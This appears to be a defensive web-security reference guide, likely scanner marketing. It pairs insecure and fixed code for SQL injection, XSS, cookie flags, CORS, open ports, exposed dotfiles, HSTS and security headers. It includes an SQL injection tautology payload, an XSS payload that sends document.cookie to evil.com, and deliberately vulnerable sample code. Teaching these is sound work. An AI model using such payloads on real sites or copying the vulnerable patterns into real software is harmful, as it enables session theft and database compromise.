SQL Injection (SQLi)

Reference Guide 01 • Database Security Architecture

Technical Synopsis & Mechanism

SQL Injection (SQLi) manipulates application input boundaries to interfere with backend database query execution. When user-supplied data is dynamically concatenated into raw SQL statements without strict sanitization, malicious operators can append arbitrary commands, bypassing authentication boundaries and actively altering logical query constraints at the data storage layer.

Real-World Risk Vector

Leaving this vector open exposes absolute business infrastructure to catastrophic consequences. Attackers can exfiltrate entire encrypted payload tables, dump sensitive user authentication credentials, vertically escalate administrative privileges, or drop production schema matrices entirely, resulting in fatal data exposure and permanent infrastructure compromise.

Code Sandbox Environments

INSECURE CODE SAMPLE (Python Concatenation) 
def get_user_data(user_id):
    # DANGEROUS: Direct string concatenation of untrusted input
    query = "SELECT * FROM users WHERE id = '" + user_id + "';"
    cursor.execute(query)
    return cursor.fetchall()
    
# Exploit Payload: admin' OR '1'='1
# Resulting Query: SELECT * FROM users WHERE id = 'admin' OR '1'='1';
REMEDIATED PRODUCTION CODE (Python Parameterized Query) 
def get_user_data(user_id):
    # SECURE: Structural type isolation via parameterized placeholders
    query = "SELECT * FROM users WHERE id = %s;"
    cursor.execute(query, (user_id,))
    return cursor.fetchall()

# Exploit Payload: admin' OR '1'='1
# Execution Engine treats the payload strictly as a literal string value.

Perimeter Identification Vector

Automated DAST agents identify this threat behavior by injecting logical tautologies, syntax-breaking single quotes, and delayed-time sleep commands into dynamic HTTP parameters. By analyzing server response anomalies, HTTP 500 error cascades, and forced timing delays, the scanner mathematically verifies active injection pathways from the external perimeter.

Cross-Site Scripting (XSS)

Reference Guide 02 • Client-Side Execution Layer

Technical Synopsis & Mechanism

Cross-Site Scripting allows attackers to inject malicious client-side JavaScript into web pages viewed by other users. This bypasses the Same-Origin Policy and executes directly within the victim's browser context.

Real-World Risk Vector

Exposes active user sessions to immediate takeover, allows credential theft via DOM reading, and can permanently ruin site trust by rewriting page content for phishing attacks.

Code Sandbox Environments

INSECURE CODE SAMPLE (PHP Reflection)
// DANGEROUS: Rendering raw URL parameters directly to the DOM
<h1>Welcome, <?php echo $_GET['name']; ?></h1>

// Exploit Payload: ?name=<script>fetch('http://evil.com?c='+document.cookie)</script>
REMEDIATED PRODUCTION CODE (PHP Escaping)
// SECURE: Encoding HTML entities to neutralize script tags
<h1>Welcome, <?php echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8'); ?></h1>

// Exploit Neutralized: Rendered strictly as literal text onscreen.

Perimeter Identification Vector

DAST agents inject polymorphic alert payloads `<script>alert(1)</script>` into query parameters and analyze if they reflect unescaped in the raw HTML response.

Session Hijacking Vectors

Reference Guide 03 • Authentication State Control

Technical Synopsis & Mechanism

Predictable or improperly scoped session tokens allow adversaries to impersonate authenticated users. Missing Secure or HttpOnly flags on cookies permit malicious client scripts or network snoopers to intercept session keys.

Real-World Risk Vector

Complete bypass of authentication layers. Attackers can access billing details, reset passwords, or perform actions as the victim without ever knowing their credentials.

Code Sandbox Environments

INSECURE CODE SAMPLE (HTTP Header)
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123xyz; Path=/

# DANGEROUS: Token is accessible via JS (document.cookie) and sent over plaintext HTTP.
REMEDIATED PRODUCTION CODE (HTTP Header)
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123xyz; Path=/; Secure; HttpOnly; SameSite=Strict

# SECURE: Token blocked from JS, requires HTTPS, and ignores cross-origin requests.

Perimeter Identification Vector

Scanner flags missing Secure and HttpOnly attributes on cookies returned during the initial login authentication handshake.

Malware & Cross-Origin Risks

Reference Guide 04 • Third-Party Supply Chain Security

Technical Synopsis & Mechanism

Misconfigured CORS allows arbitrary domains to read authenticated API data, while unverified CDN scripts can inject keyloggers directly into your application payload.

Real-World Risk Vector

Silent mass-exfiltration of private data through third-party supply chain compromise, or API scraping from malicious external websites.

Code Sandbox Environments

INSECURE CODE SAMPLE (CORS Header)
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# DANGEROUS: Exposes authenticated API endpoints to any domain globally.
REMEDIATED PRODUCTION CODE (CORS Header)
Access-Control-Allow-Origin: https://trusted.example.com
Access-Control-Allow-Credentials: true

# SECURE: Strictly whitelists allowed origins.

Perimeter Identification Vector

Scanner evaluates the Access-Control-Allow-Origin response header and cross-references all script tags against malware hash blacklists.

Perimeter Service Maps

Reference Guide 05 • Network Infrastructure Firewalls

Technical Synopsis & Mechanism

Open administrative ports (SSH, RDP, MySQL) exposed directly to the public internet bypass load balancers and invite brute-force operations.

Real-World Risk Vector

Immediate zero-day susceptibility and remote code execution if a vulnerable legacy service runs on the exposed port.

Code Sandbox Environments

INSECURE CODE SAMPLE (AWS Security Group)
Type: MySQL/Aurora (Port 3306)
Source: 0.0.0.0/0 

# DANGEROUS: Opens the database to the entire global internet.
REMEDIATED PRODUCTION CODE (AWS Security Group)
Type: MySQL/Aurora (Port 3306)
Source: sg-0a1b2c3d4e (Web Application Tier)

# SECURE: Restricts access strictly to internal VPC instances.

Perimeter Identification Vector

DAST performs deep SYN port sweeping across the top 1000 administrative ports and identifies running service banners on unexpected interfaces.

Information Disclosure Assets

Reference Guide 06 • Metadata & Directory Security

Technical Synopsis & Mechanism

Leaving development metadata, .git repositories, or /robots.txt exposed reveals the internal architecture of the target.

Real-World Risk Vector

Attackers use this blueprint to find hidden administrative panels, raw API keys, or unpatched legacy endpoints before launching tailored attacks.

Code Sandbox Environments

INSECURE CODE SAMPLE (Nginx Config)
location / {
    root /var/www/html;
}
# DANGEROUS: Serves /.git/, /.env, and other hidden metadata automatically.
REMEDIATED PRODUCTION CODE (Nginx Config)
location ~ /\.(?!well-known).* {
    deny all;
}
# SECURE: Actively drops HTTP requests for hidden dotfiles with a 403.

Perimeter Identification Vector

Scanner attempts unauthenticated directory brute-forcing against standard hidden metadata paths.

Insecure Protocol Redirections

Reference Guide 07 • Transport Layer Cryptography

Technical Synopsis & Mechanism

Failing to enforce HTTP Strict Transport Security (HSTS) allows traffic interception over unencrypted HTTP protocol tunnels.

Real-World Risk Vector

Attackers on the local network (e.g., public Wi-Fi) can perform Man-In-The-Middle (MITM) attacks and capture cleartext credentials in real time.

Code Sandbox Environments

INSECURE CODE SAMPLE (HTTP Header)
HTTP/1.1 200 OK
Content-Type: text/html

# DANGEROUS: Server accepts HTTP traffic on Port 80 without upgrading.
REMEDIATED PRODUCTION CODE (HTTP Header)
HTTP/1.1 301 Moved Permanently
Location: https://example.com/
Strict-Transport-Security: max-age=31536000; includeSubDomains

# SECURE: Forces immediate redirect to TLS and locks the browser to HTTPS.

Perimeter Identification Vector

Agent connects via plain HTTP and traces the redirect chain, validating the cryptographic upgrade and HSTS header presence.

Passive Compliance Headers

Reference Guide 08 • Browser Engine Protection Directives

Technical Synopsis & Mechanism

Missing security headers like X-Frame-Options and Content-Security-Policy leave the UI vulnerable to clickjacking and data injection.

Real-World Risk Vector

Attackers can embed your site in an invisible iframe to trick users into executing destructive actions (Clickjacking), or bypass input sanitization entirely via DOM injection.

Code Sandbox Environments

INSECURE CODE SAMPLE (HTTP Header)
HTTP/1.1 200 OK
Content-Type: text/html

# DANGEROUS: UI can be framed by any domain.
REMEDIATED PRODUCTION CODE (HTTP Header)
HTTP/1.1 200 OK
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'

# SECURE: Strict framing denial and strict content execution policies.

Perimeter Identification Vector

Agent passively analyzes the raw HTTP response headers against a strict 12-point compliance matrix.
